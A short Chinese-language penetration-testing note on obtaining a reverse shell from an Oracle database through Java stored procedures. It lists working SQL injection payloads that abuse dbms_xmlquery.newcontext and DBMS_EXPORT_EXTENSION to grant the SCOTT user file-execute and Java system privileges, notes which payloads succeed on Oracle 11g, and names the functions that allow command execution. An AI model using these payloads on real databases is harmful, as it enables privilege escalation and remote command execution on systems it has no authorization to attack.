反弹shell的流程

反弹shell一般当简单的命令执行无法满足需求的时候进行。 本质上是找一个能执行java代码的函数进行命令执行反弹shell。

在可利用的函数里需要5步：

  1. 创建Java库
  2. 赋予Java权限
  3. 创建函数
  4. 赋予函数执行权限
  5. 执行

关于赋权

查看java权限列表

select * from user_java_policy where grantee_name='SCOTT';

赋权语句在Oracle11g 11.0.2.1上的表现

select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SCOTT'''', ''''SYS:java.io.FilePermission'''', ''''<<ALL FILES>>'''',''''EXECUTE'''');end;''commit;end;') from dual;#成功赋权

select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant javasyspriv to SCOTT''commit;end;') from dual;#成功赋权

select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant javauserpriv to SCOTT''commit;end;') from dual;#成功赋权

select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''SCOTT'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<<ALL FILES>>'''''''',''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual;#赋权失败

一些查看命令是否成功的语句

select * from all_objects where object_name like '%SHELL%' or object_name like '%SHELL%'

通过该语句查看是否创建java存储过程

select OBJECT_ID from all_objects where object_name ='reversetcp'
select * from all_objects where object_name like '%reversetcp%' or object_name like '%reversetcp%'

通过该语句查看函数是否创建成功

Oracle 可以命令执行的函数

  • 10g

DBMS_EXPORT_EXTENSION 输出扩展功能包，其中存在三个危险函数，get_domian_index_metadata()，get_v2_domain_index_tables()，get_domain_index_tables()。都是以sys权限定义，默认低权限用户可以调用。 DBMS_JAVA_TEST.FUNCALL()

  • 11g dbms_xmlquery.newcontext() DBMS_JAVA_TEST.FUNCALL()

DBMS_JAVA_TEST.FUNCALL()该方式无回显，需输出到文件再查看，在注入时不太方便利用，但可通过此方式反弹。
